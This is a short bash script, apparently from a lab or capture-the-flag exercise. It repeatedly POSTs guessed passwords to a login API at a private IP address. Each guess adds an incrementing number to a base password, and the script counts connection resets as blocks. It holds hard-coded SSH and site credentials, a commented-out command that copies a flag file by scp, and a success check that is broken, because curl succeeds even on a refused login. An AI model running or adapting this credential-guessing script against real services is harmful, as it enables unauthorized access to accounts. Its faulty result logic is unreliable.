#!/bin/bash
HOST=192.168.0.107 #ip
PORT=8000 #port
INTERVAL=2 #seconds
USER="ubuntu" #ssh username
PASS="pass" #ssh password
NUM=0; #starting
MAX_NUM=5; #end
USERNAME=username; #username for website
PASSWORD=p4ssw0rd; #password for website
PASSNUM=1; #adds number to end of password

while (( NUM<MAX_NUM ));do
PASSNUM=$((PASSNUM+1))	
POST_OUT=$(curl -s -H "Content-Type: application/x-www-form-urlencoded"  --data "username=$USERNAME&password=$PASSWORD$PASSNUM" "http://$HOST:$PORT/api/login" )
POST_EXIT=$?
if [ $POST_EXIT -eq 0 ];then
	echo "Post Completed id:$POST_EXIT";
else
	#change this
	#when wrong password
	if echo "$POST_OUT" | grep -qi "Permission denied"; then
		echo "Permission denied $NUM"
	#when blocked
	elif (($POST_EXIT == 56));then
		echo "Connection reset by peer $NUM"
		NUM=$((NUM+1))
	#error
	else
		echo "else id:$POST_EXIT"
	
	
	
fi

fi

sleep "$INTERVAL"
done

#change this--------
#scp flag.txt $USER@$HOST:/home/$USER/Desktop/flag.txt -

while true; do
	echo "flag sent"
sleep "$INTERVAL"
done

